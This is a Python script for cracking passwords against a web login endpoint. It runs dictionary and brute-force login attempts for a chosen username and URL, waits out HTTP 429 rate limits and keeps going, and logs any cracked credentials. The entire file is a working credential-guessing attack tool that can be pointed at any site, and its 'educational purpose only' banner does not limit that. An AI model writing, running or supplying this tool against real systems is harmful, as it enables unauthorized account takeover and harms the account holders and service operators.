import requests
import time
import string
import itertools
import argparse
from typing import Optional, Iterator
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class PasswordCracker:
    def __init__(self, target_url: str, username: str):
        """
        Initialize the password cracker with target URL and username.
        
        Args:
            target_url: The URL of the login endpoint
            username: The username to attempt to crack
        """
        self.target_url = target_url
        self.username = username
        self.session = requests.Session()
        self.attempts = 0
        self.start_time = time.time()

    def try_login(self, password: str) -> bool:
        """
        Attempt a single login with the given password.
        
        Args:
            password: The password to try
            
        Returns:
            bool: True if login successful, False otherwise
        """
        try:
            response = self.session.post(
                self.target_url,
                data={
                    'username': self.username,
                    'password': password
                }
            )
            
            self.attempts += 1
            
            # Handle rate limiting
            if response.status_code == 429:
                logging.warning("Rate limit hit. Sleeping for 30 seconds...")
                time.sleep(30)
                return False
            
            # Check if login was successful
            return 'success' in response.json()
            
        except Exception as e:
            logging.error(f"Error during login attempt: {e}")
            return False

    def dictionary_attack(self, wordlist_path: str) -> Optional[str]:
        """
        Perform a dictionary attack using a wordlist file.
        
        Args:
            wordlist_path: Path to the wordlist file
            
        Returns:
            Optional[str]: The cracked password or None if not found
        """
        logging.info(f"Starting dictionary attack using wordlist: {wordlist_path}")
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8') as f:
                for password in f:
                    password = password.strip()
                    
                    if self.try_login(password):
                        self.log_success(password)
                        return password
                    
                    if self.attempts % 10 == 0:
                        self.log_progress()
                        
        except FileNotFoundError:
            logging.error(f"Wordlist file not found: {wordlist_path}")
            
        return None

    def generate_passwords(self, charset: str, max_length: int) -> Iterator[str]:
        """
        Generate all possible passwords up to max_length using the given charset.
        
        Args:
            charset: String containing characters to use
            max_length: Maximum password length to try
            
        Yields:
            str: Each generated password
        """
        for length in range(1, max_length + 1):
            for guess in itertools.product(charset, repeat=length):
                yield ''.join(guess)

    def brute_force_attack(self, max_length: int = 8, charset: str = None) -> Optional[str]:
        """
        Perform a brute force attack trying all possible combinations.
        
        Args:
            max_length: Maximum password length to try
            charset: String containing characters to try (default: ascii_lowercase + digits)
            
        Returns:
            Optional[str]: The cracked password or None if not found
        """
        if charset is None:
            charset = string.ascii_lowercase + string.digits
            
        logging.info(f"Starting brute force attack (max length: {max_length}, charset: {charset})")
        
        for password in self.generate_passwords(charset, max_length):
            if self.try_login(password):
                self.log_success(password)
                return password
                
            if self.attempts % 100 == 0:
                self.log_progress()
                
        return None

    def log_progress(self):
        """Log current progress and speed"""
        elapsed = time.time() - self.start_time
        speed = self.attempts / elapsed if elapsed > 0 else 0
        logging.info(f"Attempts: {self.attempts}, Speed: {speed:.2f} passwords/sec")

    def log_success(self, password: str):
        """Log successful password crack"""
        elapsed = time.time() - self.start_time
        logging.info(f"Password cracked in {elapsed:.2f} seconds after {self.attempts} attempts!")
        logging.info(f"Username: {self.username}")
        logging.info(f"Password: {password}")

def main():
    parser = argparse.ArgumentParser(description='Educational Password Cracker')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--username', required=True, help='Username to crack')
    parser.add_argument('--wordlist', help='Path to wordlist for dictionary attack')
    parser.add_argument('--max-length', type=int, default=8, help='Max password length for brute force')
    args = parser.parse_args()

    cracker = PasswordCracker(args.url, args.username)
    
    if args.wordlist:
        password = cracker.dictionary_attack(args.wordlist)
        if password:
            return
            
    # If dictionary attack fails or no wordlist provided, try brute force
    cracker.brute_force_attack(args.max_length)

if __name__ == '__main__':
    print("""
    ⚠️ EDUCATIONAL PURPOSE ONLY ⚠️
    This script is for learning about password security in controlled environments.
    Never use against real systems without explicit permission.
    """)
    main()